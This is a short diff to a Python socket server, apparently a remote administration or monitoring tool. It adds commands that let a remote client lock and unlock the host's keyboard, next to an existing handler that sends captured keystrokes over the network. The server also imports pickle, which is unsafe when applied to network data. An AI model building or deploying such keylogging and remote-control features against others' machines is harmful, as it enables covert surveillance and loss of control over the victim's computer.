@@ -2,7 +2,7 @@ import os
 from pickle import loads, dumps
 import socket
 import threading
-import utils, process, keystroke, registry
+import utils, process, keystroke, registry, lock_keyboard
 import tkinter.messagebox as msbx
 
 HOST = socket.gethostname()
@@ -67,6 +67,14 @@ def connection_handler(connection, address):
 
         elif req == 'keystroke-get':
             data = dumps(keystroke_detector.get_keys())
+            connection.sendall(data)
+
+        elif req == 'lock-keyboard':
+            data = dumps(lock_keyboard.enable())
+            connection.sendall(data)
+
+        elif req == 'unlock-keyboard':
+            data = dumps(lock_keyboard.disable())
             connection.sendall(data)
 
         elif req == 'reg-getvalue':
